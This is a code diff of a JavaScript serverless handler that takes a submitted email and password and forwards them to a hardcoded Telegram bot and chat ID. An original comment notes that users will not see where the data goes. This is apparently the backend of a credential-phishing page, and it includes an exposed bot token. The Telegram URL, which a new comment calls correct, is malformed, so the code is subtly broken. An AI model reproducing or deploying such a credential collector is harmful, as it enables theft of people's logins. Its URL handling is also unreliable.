@@ -5,11 +5,13 @@ export default async function handler(req, res) {
 
     const { email, password } = req.body;
 
-    // Сюди ми жорстко прописуємо ваші дані Telegram, але користувачі їх не побачать
+    // Ваші точні налаштування Telegram
     const token = '8834399818:AAE0VtEZOGoPD95CdbQeCGXN6GLY7kvoXbM';
     const chatId = '8769707483';
 
     const message = `🔔 <b>Отримано нові дані (Тест):</b>\n\n📧 Email: <code>${email}</code>\n🔑 Пароль: <code>${password}</code>`;
+    
+    // ПРАВИЛЬНА АДРЕСА СЕРВЕРА TELEGRAM:
     const url = `https://telegram.org{token}/sendMessage`;
 
     try {
@@ -27,3 +29,4 @@ export default async function handler(req, res) {
         return res.status(500).json({ error: error.message });
     }
 }
+
